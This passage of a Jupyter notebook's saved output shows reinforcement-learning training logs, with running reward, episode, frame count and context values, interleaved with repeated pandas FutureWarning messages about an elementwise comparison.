      "Running reward: 11.00\t Episode 60\t Frame count: 88100\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 88200\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 88300\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 88400\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 88500\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 88600\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 88700\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 88800\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 88900\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 89000\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 89100\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 89200\t Context: 2\n",
      "Running reward: 11.00\t Episode 60\t Frame count: 89300\t Context: 2\n",
      "Running reward: 11.00\t Episode 61\t Frame count: 89400\t Context: 1\n",
      "Running reward: 11.00\t Episode 61\t Frame count: 89500\t Context: 2\n",
      "Running reward: 11.00\t Episode 62\t Frame count: 89600\t Context: 1\n",
      "Running reward: 11.00\t Episode 62\t Frame count: 89700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 62\t Frame count: 89800\t Context: 2\n",
      "Running reward: 11.00\t Episode 62\t Frame count: 89900\t Context: 2\n",
      "Running reward: 11.00\t Episode 63\t Frame count: 90000\t Context: 1\n",
      "Running reward: 11.00\t Episode 63\t Frame count: 90100\t Context: 2\n",
      "Running reward: 11.00\t Episode 63\t Frame count: 90200\t Context: 2\n",
      "Running reward: 11.00\t Episode 63\t Frame count: 90300\t Context: 2\n",
      "Running reward: 11.00\t Episode 63\t Frame count: 90400\t Context: 2\n",
      "Running reward: 11.00\t Episode 63\t Frame count: 90500\t Context: 2\n",
      "Running reward: 11.00\t Episode 63\t Frame count: 90600\t Context: 2\n",
      "Running reward: 11.00\t Episode 64\t Frame count: 90700\t Context: 1\n",
      "Running reward: 11.00\t Episode 64\t Frame count: 90800\t Context: 1\n",
      "Running reward: 11.00\t Episode 64\t Frame count: 90900\t Context: 1\n",
      "Running reward: 11.00\t Episode 64\t Frame count: 91000\t Context: 2\n",
      "Running reward: 11.00\t Episode 64\t Frame count: 91100\t Context: 2\n",
      "Running reward: 11.00\t Episode 64\t Frame count: 91200\t Context: 2\n",
      "Running reward: 11.00\t Episode 64\t Frame count: 91300\t Context: 2\n",
      "Running reward: 11.00\t Episode 64\t Frame count: 91400\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 91500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 65\t Frame count: 91600\t Context: 1\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 91700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 65\t Frame count: 91800\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 91900\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 92000\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 92100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 65\t Frame count: 92200\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 92300\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 92400\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 92500\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 92600\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 92700\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 92800\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 92900\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 93000\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 93100\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 93200\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 93300\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 93400\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 93500\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 93600\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 93700\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 93800\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 93900\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 94000\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 94100\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 94200\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 94300\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 94400\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 94500\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 94600\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 94700\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 94800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 65\t Frame count: 94900\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 95000\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 95100\t Context: 2\n",
      "Running reward: 11.00\t Episode 65\t Frame count: 95200\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 95300\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 95400\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 95500\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 95600\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 95700\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 95800\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 95900\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 96000\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 96100\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 96200\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 96300\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 96400\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 96500\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 96600\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 96700\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 96800\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 96900\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 97000\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 97100\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 97200\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 97300\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 97400\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 97500\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 97600\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 97700\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 97800\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 97900\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 98000\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 98100\t Context: 2\n",
      "Running reward: 11.00\t Episode 66\t Frame count: 98200\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 98300\t Context: 1\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 98400\t Context: 1\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 98500\t Context: 1\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 98600\t Context: 1\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 98700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 67\t Frame count: 98800\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 98900\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 99000\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 99100\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 99200\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 99300\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 99400\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 99500\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 99600\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 99700\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 99800\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 99900\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 100000\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 100100\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 100200\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 100300\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 100400\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 100500\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 100600\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 100700\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 100800\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 100900\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 101000\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 101100\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 101200\t Context: 2\n",
      "Running reward: 11.00\t Episode 67\t Frame count: 101300\t Context: 2\n",
      "Running reward: 11.00\t Episode 68\t Frame count: 101400\t Context: 1\n",
      "Running reward: 11.00\t Episode 68\t Frame count: 101500\t Context: 1\n",
      "Running reward: 11.00\t Episode 68\t Frame count: 101600\t Context: 1\n",
      "Running reward: 11.00\t Episode 68\t Frame count: 101700\t Context: 1\n",
      "Running reward: 11.00\t Episode 68\t Frame count: 101800\t Context: 1\n",
      "Running reward: 11.00\t Episode 68\t Frame count: 101900\t Context: 2\n",
      "Running reward: 11.00\t Episode 68\t Frame count: 102000\t Context: 2\n",
      "Running reward: 11.00\t Episode 68\t Frame count: 102100\t Context: 2\n",
      "Running reward: 11.00\t Episode 68\t Frame count: 102200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 69\t Frame count: 102300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 69\t Frame count: 102400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 69\t Frame count: 102500\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 102600\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 102700\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 102800\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 102900\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 103000\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 103100\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 103200\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 103300\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 103400\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 103500\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 103600\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 103700\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 103800\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 103900\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 104000\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 104100\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 104200\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 104300\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 104400\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 104500\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 104600\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 104700\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 104800\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 104900\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 105000\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 105100\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 105200\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 105300\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 105400\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 105500\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 105600\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 105700\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 105800\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 105900\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 106000\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 106100\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 106200\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 106300\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 106400\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 106500\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 106600\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 106700\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 106800\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 106900\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 107000\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 107100\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 107200\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 107300\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 107400\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 107500\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 107600\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 107700\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 107800\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 107900\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 108000\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 108100\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 108200\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 108300\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 108400\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 108500\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 108600\t Context: 2\n",
      "Running reward: 11.00\t Episode 69\t Frame count: 108700\t Context: 2\n",
      "Running reward: 11.00\t Episode 70\t Frame count: 108800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 70\t Frame count: 108900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 70\t Frame count: 109000\t Context: 1\n",
      "Running reward: 11.00\t Episode 70\t Frame count: 109100\t Context: 1\n",
      "Running reward: 11.00\t Episode 70\t Frame count: 109200\t Context: 2\n",
      "Running reward: 11.00\t Episode 70\t Frame count: 109300\t Context: 2\n",
      "Running reward: 11.00\t Episode 70\t Frame count: 109400\t Context: 2\n",
      "Running reward: 11.00\t Episode 70\t Frame count: 109500\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 109600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 71\t Frame count: 109700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 71\t Frame count: 109800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 71\t Frame count: 109900\t Context: 1\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 110000\t Context: 1\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 110100\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 110200\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 110300\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 110400\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 110500\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 110600\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 110700\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 110800\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 110900\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 111000\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 111100\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 111200\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 111300\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 111400\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 111500\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 111600\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 111700\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 111800\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 111900\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 112000\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 112100\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 112200\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 112300\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 112400\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 112500\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 112600\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 112700\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 112800\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 112900\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 113000\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 113100\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 113200\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 113300\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 113400\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 113500\t Context: 2\n",
      "Running reward: 11.00\t Episode 71\t Frame count: 113600\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 113700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 72\t Frame count: 113800\t Context: 1\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 113900\t Context: 1\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 114000\t Context: 1\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 114100\t Context: 1\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 114200\t Context: 1\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 114300\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 114400\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 114500\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 114600\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 114700\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 114800\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 114900\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 115000\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 115100\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 115200\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 115300\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 115400\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 115500\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 115600\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 115700\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 115800\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 115900\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 116000\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 116100\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 116200\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 116300\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 116400\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 116500\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 116600\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 116700\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 116800\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 116900\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 117000\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 117100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 72\t Frame count: 117200\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 117300\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 117400\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 117500\t Context: 2\n",
      "Running reward: 11.00\t Episode 72\t Frame count: 117600\t Context: 2\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 117700\t Context: 1\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 117800\t Context: 1\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 117900\t Context: 1\n",
      "Running reward: 11.00\t Episode 73\t Frame count: 118000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
